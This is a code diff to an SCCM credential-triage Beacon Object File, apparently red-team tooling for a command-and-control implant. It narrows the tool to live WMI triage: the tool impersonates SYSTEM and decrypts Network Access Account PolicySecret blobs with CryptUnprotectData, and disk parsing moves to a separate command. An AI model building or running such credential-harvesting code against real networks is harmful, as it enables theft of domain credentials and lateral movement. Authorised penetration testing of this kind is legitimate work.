@@ -1,12 +1,11 @@
 /*
- * sccm.c — BOF for SCCM credential triage
+ * sccm.c — BOF for SCCM CRED-3 triage
  *
  * Usage:
- *   sccm [/target:PATH]
+ *   sccm
  *
- * Defaults to live SCCM WMI triage (CRED-3) and decrypts
+ * Queries live SCCM policy via WMI (CRED-3) and decrypts
  * NAA PolicySecret blobs locally with CryptUnprotectData as SYSTEM.
- * If /target:PATH is supplied, parses OBJECTS.DATA from disk (CRED-4).
  * Requires high integrity (admin).
  */
 #include "beacon.h"
@@ -26,10 +25,13 @@ void go(char* args, int args_len) {
         return;
     }
 
-    wchar_t* target = NULL;
-    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
+    if (target_str && strlen(target_str) > 0) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[!] sccm no longer accepts /target:PATH; use sccm_disk for CRED-4 OBJECTS.DATA triage\n");
+        return;
+    }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM (BOF) ===\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-3 (BOF) ===\n");
 
     BOOL already_system = is_system();
     BOOL impersonated = FALSE;
@@ -38,18 +40,12 @@ void go(char* args, int args_len) {
         if (!get_system()) {
             BeaconPrintf(CALLBACK_ERROR,
                 "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
-            if (target) intFree(target);
             return;
         }
         impersonated = TRUE;
     }
 
-    if (target) {
-        triage_sccm(NULL, target);
-    } else {
-        triage_sccm_wmi();
-    }
+    triage_sccm_wmi();
 
     if (impersonated) revert_to_self_helper();
-    if (target) intFree(target);
 }
